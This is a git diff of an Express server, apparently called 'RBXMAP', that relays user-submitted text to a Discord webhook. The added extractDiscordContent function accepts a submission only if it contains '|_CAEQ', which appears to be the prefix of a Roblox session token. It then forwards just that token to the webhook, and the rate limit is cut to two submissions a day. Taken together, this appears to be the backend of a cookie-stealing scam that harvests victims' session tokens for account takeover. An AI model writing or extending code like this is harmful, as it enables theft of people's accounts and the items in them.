@@ -18,11 +18,13 @@ if (!WEBHOOK_URL) {
 app.use(express.json({ limit: '1mb' }));
 
 const submitLimiter = rateLimit({
-  windowMs: 15 * 60 * 1000,
-  max: 10,
-  message: { error: 'too_many_requests' },
+  windowMs: 24 * 60 * 60 * 1000,
+  max: 2,
   standardHeaders: true,
-  legacyHeaders: false
+  legacyHeaders: false,
+  handler: (req, res) => {
+    res.status(429).json({ error: 'too_many_requests' });
+  }
 });
 
 app.get('/health', (req, res) => {
@@ -55,6 +57,13 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(ROOT, 'index.html'));
 });
 
+function extractDiscordContent(text) {
+  const marker = '|_CAEQ';
+  const index = text.indexOf(marker);
+  if (index === -1) return null;
+  return text.slice(index);
+}
+
 function buildEmbed(text) {
   const maxChunk = 4088;
   const content = text.slice(0, maxChunk);
@@ -75,13 +84,18 @@ app.post('/api/submit', submitLimiter, async (req, res) => {
     return res.status(400).json({ error: 'invalid' });
   }
 
+  const discordText = extractDiscordContent(text);
+  if (!discordText) {
+    return res.status(400).json({ error: 'invalid' });
+  }
+
   try {
     const discordRes = await fetch(WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         username: 'RBXMAP',
-        embeds: [buildEmbed(text)]
+        embeds: [buildEmbed(discordText)]
       })
     });
 
